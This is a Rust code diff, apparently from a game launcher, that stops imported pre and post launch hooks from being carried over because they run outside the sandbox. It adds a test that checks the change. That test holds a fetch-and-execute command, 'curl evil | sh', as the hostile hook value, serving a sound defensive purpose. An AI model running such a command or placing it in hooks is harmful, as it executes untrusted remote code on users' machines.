@@ -783,9 +783,12 @@ fn profile_update(settings: &ExternalSettings, java_path: Option<String>) -> Pro
                 Patch::Set(Resolution { width, height })
             }),
         force_fullscreen: settings.fullscreen.map_or(Patch::Unchanged, Patch::Set),
-        hook_pre: set(&settings.hook_pre),
+        // pre and post hooks run as plain shell commands outside the game
+        // sandbox, so they are never carried over silently; the wrapper and
+        // JVM settings run inside it
+        hook_pre: Patch::Unchanged,
         hook_wrapper: set(&settings.hook_wrapper),
-        hook_post: set(&settings.hook_post),
+        hook_post: Patch::Unchanged,
         java_path: java_path.map_or(Patch::Unchanged, Patch::Set),
         ..ProfileUpdate::default()
     }
@@ -1533,6 +1536,22 @@ mod tests {
         assert_eq!(update.launch_env, Patch::Set("GOOD=1".to_string()));
         assert_eq!(update.mem_max, Patch::Set(4096));
         assert!(update.launch_args.is_unchanged());
+    }
+
+    #[test]
+    fn imported_hooks_that_run_outside_the_sandbox_are_dropped() {
+        let settings = ExternalSettings {
+            hook_pre: Some("curl evil | sh".to_string()),
+            hook_wrapper: Some("gamemoderun".to_string()),
+            hook_post: Some("echo done".to_string()),
+            ..ExternalSettings::default()
+        };
+
+        let update = profile_update(&settings, None);
+
+        assert_eq!(update.hook_pre, Patch::Unchanged);
+        assert_eq!(update.hook_post, Patch::Unchanged);
+        assert_eq!(update.hook_wrapper, Patch::Set("gamemoderun".to_string()));
     }
 
     #[test]
